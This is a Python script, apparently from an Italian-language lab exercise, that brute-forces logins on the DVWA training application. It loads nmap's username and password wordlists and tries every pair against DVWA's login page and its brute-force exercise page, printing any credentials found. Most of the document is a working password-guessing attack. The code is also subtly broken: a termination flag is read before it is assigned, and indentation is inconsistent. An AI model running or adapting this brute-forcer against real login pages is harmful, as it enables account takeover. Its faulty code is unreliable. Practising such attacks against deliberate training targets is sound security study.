import requests
from colorama import Fore, Style

username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

user_list = [s.strip() for s in user_list]
user_list[0], user_list[1] = user_list[1], user_list[0]

pwd_list = [s.strip() for s in pwd_list]
pwd_list = pwd_list[8:]

IP = input("Inserisci indirizzo IP del server: ")
login_home_url = "http://" + IP + "/dvwa/login.php"
login_brute_force_url = "http://" + IP + "/dvwa/vulnerabilities/brute/"

print(Fore.YELLOW + "Tentativi di login all'url: ", login_home_url + Style.RESET_ALL)
for user in user_list:
	for pwd in pwd_list:
		print("Tentativo di login nella Home della DVWA con username", user, "e password", pwd)
		# Creazione della sessione
		session = requests.Session()
		# Tentativo di login
		login_data = {"username": user,"password": pwd,"Login": "Login"}
		response = session.post(login_home_url, data=login_data) # Richiesta POST con dati separati
		# Verifica se il login è avvenuto con successo
		if "Login failed" in response.text:
    			print(Fore.RED + "Login fallito!" +  Style.RESET_ALL)
		else:
    			print(Fore.GREEN + "Login avvenuto con successo!" +  Style.RESET_ALL)
    			print("Le credenziali per l'accesso alla Home della DVWA all'url", login_home_url, "sono username: " + Fore.GREEN + user + Style.RESET_ALL + " e password: " + Fore.GREEN + pwd + Style.RESET_ALL)
    			termina_programma = True
    			break
	if termina_programma:
          break
# Ora si può usare la sessione per effettuare altre richieste autenticate, cercando di entrare nella sezione brute force della DVWA
print(Fore.YELLOW + "Tentativi di login all'url: ", login_brute_force_url + Style.RESET_ALL)
for user in user_list:
	for pwd in pwd_list:
		print("Tentativo di login su Brute Force della DVWA con username", user, "e password", pwd)
		# Tentativo di login
		login_data = {"username": user,"password": pwd,"Login": "Login"}
		url_with_credentials = f"{login_brute_force_url}?username={user}&password={pwd}&Login=Login"
		response = session.get(url_with_credentials) # Richiesta GET con dati associati all'url
		# Verifica se il login è avvenuto con successo
		if "Username and/or password incorrect." in response.text:
    			print(Fore.RED + "Login fallito!" +  Style.RESET_ALL)
		else:
    			print(Fore.GREEN + "Login avvenuto con successo!" +  Style.RESET_ALL)
    			print("Le credenziali per l'accesso alla sezione Brute Force della DVWA all'url", login_brute_force_url, "sono username: " + Fore.GREEN + user + Style.RESET_ALL + " e password: " + Fore.GREEN + pwd + Style.RESET_ALL)
    			termina_programma = True
    			break
	if termina_programma:
          break

		
		

